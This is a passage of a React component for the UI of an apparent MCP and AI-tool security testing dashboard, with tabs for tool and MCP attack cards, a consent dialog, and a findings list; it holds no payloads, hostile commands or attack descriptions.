            <div className="flex items-center gap-2 rounded-lg border border-[var(--bu-electric)]/30 bg-[var(--bu-electric)]/5 px-3 py-2 mb-4">
              <Shield className="w-4 h-4 text-[var(--bu-electric)] shrink-0" aria-hidden="true" />
              <p className="text-xs text-[var(--bu-electric)]">
                Passive Mode: All tools are observation-only. Switch to Basic, Advanced, or Aggressive to execute attacks.
              </p>
            </div>
          )}
          <div className="flex items-center gap-2 mb-3">
            <LayoutGrid className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
            <h3 className="text-sm font-semibold text-[var(--foreground)]">
              Tool Integration Attacks
            </h3>
            <Badge variant="outline" className="ml-auto text-xs border-[var(--severity-low)]/30 bg-[var(--severity-low)]/10 text-[var(--severity-low)]">
              <Wrench className="h-3 w-3 mr-1" aria-hidden="true" />
              {ATTACK_TOOLS.filter((t) => t.type === 'tool').length} tools
            </Badge>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 stagger-children">
            {ATTACK_TOOLS.filter((t) => t.type === 'tool').map((tool) => (
              <AttackToolCard
                key={tool.id}
                name={tool.name}
                type={tool.type}
                description={tool.description}
                severity={tool.severity}
                enabled={isToolEnabledAtMode(tool, mode)}
                learnMore={LEARN_MORE_DATA[tool.id]}
              />
            ))}
          </div>
        </TabsContent>

        {/* Skills Tab */}
        <TabsContent value="skills" className="mt-4">
          <SkillsLibrary onExecuteSkill={handleExecuteSkill} executingSkillId={executingSkill} />
        </TabsContent>

        {/* MCP Tab — mcp-type attack cards */}
        <TabsContent value="mcp" className="mt-4">
          <div className="flex items-center gap-2 mb-3">
            <Shield className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
            <h3 className="text-sm font-semibold text-[var(--foreground)]">
              MCP Protocol Attacks
            </h3>
            <Badge variant="outline" className="ml-auto text-xs border-[var(--dojo-primary)]/30 bg-[var(--dojo-primary)]/10 text-[var(--dojo-primary)]">
              <Shield className="h-3 w-3 mr-1" aria-hidden="true" />
              {ATTACK_TOOLS.filter((t) => t.type === 'mcp').length} attacks
            </Badge>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 stagger-children">
            {ATTACK_TOOLS.filter((t) => t.type === 'mcp').map((tool) => (
              <AttackToolCard
                key={tool.id}
                name={tool.name}
                type={tool.type}
                description={tool.description}
                severity={tool.severity}
                enabled={isToolEnabledAtMode(tool, mode)}
                learnMore={LEARN_MORE_DATA[tool.id]}
              />
            ))}
          </div>
        </TabsContent>

        {/* Protocol Fuzz Tab — placeholder */}
        <TabsContent value="protocol-fuzz" className="mt-4">
          <div className="flex flex-col items-center justify-center py-12">
            <Zap className="h-8 w-8 text-muted-foreground mb-3" aria-hidden="true" />
            <p className="text-sm font-medium">Protocol Fuzzing</p>
            <p className="text-xs text-muted-foreground mt-1">
              Coming in Phase 11 — MCP protocol fuzzing engine integration.
            </p>
          </div>
        </TabsContent>

        {/* WebMCP Tab — functional panel (H16.3) */}
        <TabsContent value="webmcp" className="mt-4">
          <div className="space-y-4">
            {/* Header */}
            <div className="flex items-center gap-2 mb-3">
              <Globe className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
              <h3 className="text-sm font-semibold text-[var(--foreground)]">
                WebMCP Attack Testing
              </h3>
              <Badge variant="outline" className="ml-auto text-xs">
                {WEBMCP_CATEGORIES.reduce((sum, c) => sum + c.count, 0)} vectors
              </Badge>
            </div>

            {/* Target URL Input */}
            <Card>
              <CardContent className="p-4 space-y-3">
                <div>
                  <label htmlFor="wmcp-target-url" className="text-xs font-medium text-[var(--foreground)] block mb-1.5">
                    Target URL
                  </label>
                  <div className="flex gap-2">
                    <input
                      id="wmcp-target-url"
                      type="url"
                      value={wmcpTargetUrl}
                      onChange={(e) => handleWmcpUrlChange(e.target.value)}
                      placeholder="https://mcp-server.example.com/mcp"
                      aria-label="Target MCP server URL"
                      aria-describedby={wmcpUrlError ? 'wmcp-url-error' : undefined}
                      aria-invalid={wmcpUrlError ? true : undefined}
                      className={cn(
                        'flex-1 h-11 px-3 text-sm rounded-md border bg-[var(--bg-secondary)]',
                        'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]',
                        'placeholder:text-muted-foreground',
                        wmcpUrlError
                          ? 'border-[var(--danger)] text-[var(--danger)]'
                          : 'border-[var(--border)]',
                      )}
                    />
                  </div>
                  {wmcpUrlError && (
                    <p id="wmcp-url-error" className="text-xs text-[var(--danger)] mt-1 flex items-center gap-1">
                      <AlertTriangle className="h-3 w-3 flex-shrink-0" aria-hidden="true" />
                      {wmcpUrlError}
                    </p>
                  )}
                </div>

                {/* Transport Selector */}
                <div>
                  <label className="text-xs font-medium text-[var(--foreground)] block mb-1.5">
                    Transport Type
                  </label>
                  <div className="flex gap-2" role="radiogroup" aria-label="Select WebMCP transport type">
                    {(['http', 'sse', 'websocket'] as const).map((t) => (
                      <button
                        key={t}
                        role="radio"
                        aria-checked={wmcpTransport === t}
                        aria-label={`${t.toUpperCase()} transport`}
                        onClick={() => setWmcpTransport(t)}
                        className={cn(
                          'px-3 min-h-[44px] rounded-md border text-xs font-medium',
                          'motion-safe:transition-colors motion-safe:duration-[var(--transition-normal)]',
                          'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]',
                          wmcpTransport === t
                            ? 'border-[var(--dojo-primary)] bg-[var(--dojo-primary)]/10 text-[var(--dojo-primary)]'
                            : 'border-[var(--border)] text-muted-foreground hover:bg-[var(--bg-quaternary)]',
                        )}
                      >
                        {t.toUpperCase()}
                      </button>
                    ))}
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Attack Category Selector */}
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm flex items-center gap-2">
                  <Swords className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
                  Attack Categories
                </CardTitle>
              </CardHeader>
              <CardContent className="p-4 pt-0">
                <fieldset>
                  <legend className="sr-only">Select attack categories to test</legend>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {WEBMCP_CATEGORIES.map((cat) => (
                      <label
                        key={cat.id}
                        className={cn(
                          'flex items-center gap-2 px-3 min-h-[44px] rounded-md border cursor-pointer',
                          'motion-safe:transition-colors motion-safe:duration-[var(--transition-normal)]',
                          'hover:bg-[var(--bg-quaternary)]',
                          'focus-within:ring-2 focus-within:ring-[var(--ring)]',
                          wmcpCategories.has(cat.id)
                            ? 'border-[var(--dojo-primary)] bg-[var(--dojo-primary)]/5'
                            : 'border-[var(--border)]',
                        )}
                      >
                        <input
                          type="checkbox"
                          checked={wmcpCategories.has(cat.id)}
                          onChange={() => handleWmcpToggleCategory(cat.id)}
                          aria-label={`${cat.label} (${cat.count} vectors)`}
                          className="h-4 w-4 rounded border-[var(--border)] accent-[var(--dojo-primary)]"
                        />
                        <span className="text-xs font-medium text-[var(--foreground)] flex-1">
                          {cat.label}
                        </span>
                        <Badge variant="outline" className="text-[10px] px-1.5 py-0">
                          {cat.count}
                        </Badge>
                      </label>
                    ))}
                  </div>
                </fieldset>
              </CardContent>
            </Card>

            {/* Execute Button */}
            <div className="flex items-center gap-3">
              <Button
                onClick={handleWmcpRequestExecute}
                disabled={!wmcpTargetUrl.trim() || !!wmcpUrlError || wmcpCategories.size === 0 || wmcpIsExecuting}
                aria-label={wmcpIsExecuting ? 'Executing WebMCP tests' : 'Execute WebMCP attack tests'}
                className="min-h-[44px] gap-2"
              >
                {wmcpIsExecuting ? (
                  <>
                    <Activity className="h-4 w-4 motion-safe:animate-spin" aria-hidden="true" />
                    Executing...
                  </>
                ) : (
                  <>
                    <Zap className="h-4 w-4" aria-hidden="true" />
                    Execute Tests
                  </>
                )}
              </Button>
              <span className="text-xs text-muted-foreground">
                {wmcpCategories.size} of {WEBMCP_CATEGORIES.length} categories selected
              </span>
            </div>

            {/* Consent Dialog */}
            {wmcpShowConsent && (
              <div
                className="fixed inset-0 z-50 flex items-center justify-center bg-black/50"
                role="alertdialog"
                aria-modal="true"
                aria-labelledby="wmcp-consent-title"
                aria-describedby="wmcp-consent-desc"
              >
                <Card className="max-w-md w-full mx-4">
                  <CardHeader className="pb-2">
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-sm flex items-center gap-2" id="wmcp-consent-title">
                        <Lock className="h-4 w-4 text-[var(--warning)]" aria-hidden="true" />
                        Confirm Execution
                      </CardTitle>
                      <button
                        onClick={handleWmcpCancelConsent}
                        aria-label="Cancel execution"
                        className="h-8 w-8 flex items-center justify-center rounded-md hover:bg-[var(--bg-quaternary)] focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]"
                      >
                        <X className="h-4 w-4" aria-hidden="true" />
                      </button>
                    </div>
                  </CardHeader>
                  <CardContent className="p-4 pt-0 space-y-3">
                    <p id="wmcp-consent-desc" className="text-xs text-muted-foreground leading-relaxed">
                      You are about to execute {wmcpCategories.size} attack
                      {wmcpCategories.size !== 1 ? ' categories' : ' category'} against{' '}
                      <span className="font-mono text-[var(--foreground)]">{wmcpTargetUrl}</span>{' '}
                      via {wmcpTransport.toUpperCase()} transport. This will run mock attack simulations
                      locally. No actual network requests will be made to the target.
                    </p>
                    <div className="flex gap-2 justify-end">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={handleWmcpCancelConsent}
                        aria-label="Cancel and return"
                        className="min-h-[44px]"
                      >
                        Cancel
                      </Button>
                      <Button
                        size="sm"
                        onClick={handleWmcpConfirmExecute}
                        aria-label="Confirm and execute WebMCP tests"
                        className="min-h-[44px] gap-1"
                      >
                        <CheckCircle2 className="h-3 w-3" aria-hidden="true" />
                        Confirm Execute
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}

            {/* Results Area */}
            {wmcpResults.length > 0 && (
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Activity className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
                    Findings ({wmcpResults.length})
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-4 pt-0 space-y-2">
                  {wmcpResults.map((finding) => {
                    const sevColors: Record<string, string> = {
                      critical: 'border-[var(--danger)] bg-[var(--danger)]/10 text-[var(--danger)]',
                      high: 'border-[var(--severity-high)] bg-[var(--severity-high)]/10 text-[var(--severity-high)]',
                      medium: 'border-[var(--warning)] bg-[var(--warning)]/10 text-[var(--warning)]',
                      low: 'border-[var(--severity-low)] bg-[var(--severity-low)]/10 text-[var(--severity-low)]',
                    }
                    return (
                      <div
                        key={finding.id}
                        className="border border-[var(--border)] rounded-md p-3 space-y-1.5"
                      >
                        <div className="flex items-start gap-2">
                          <Badge
                            variant="outline"
                            className={cn('text-[10px] px-1.5 py-0 flex-shrink-0 uppercase', sevColors[finding.severity])}
                          >
                            {finding.severity}
                          </Badge>
                          <div className="flex-1 min-w-0">
                            <p className="text-xs font-medium text-[var(--foreground)]">
                              {finding.title}
                            </p>
                            <p className="text-xs text-muted-foreground mt-0.5">
                              {finding.description}
                            </p>
                          </div>
                          <Badge variant="outline" className="text-[10px] px-1.5 py-0 flex-shrink-0">
                            {finding.category}
                          </Badge>
                        </div>
                        <pre className="text-[11px] font-mono bg-[var(--bg-tertiary)] rounded p-2 overflow-x-auto whitespace-pre-wrap break-all text-muted-foreground">
                          {finding.evidence}
                        </pre>
                      </div>
                    )
                  })}
                </CardContent>
              </Card>
            )}
          </div>
        </TabsContent>
      </Tabs>

      {/* Attack Log */}
      <AttackLog />

      {/* Session History (Story P3.2) */}
      <SessionHistory />
    </div>
  )
}
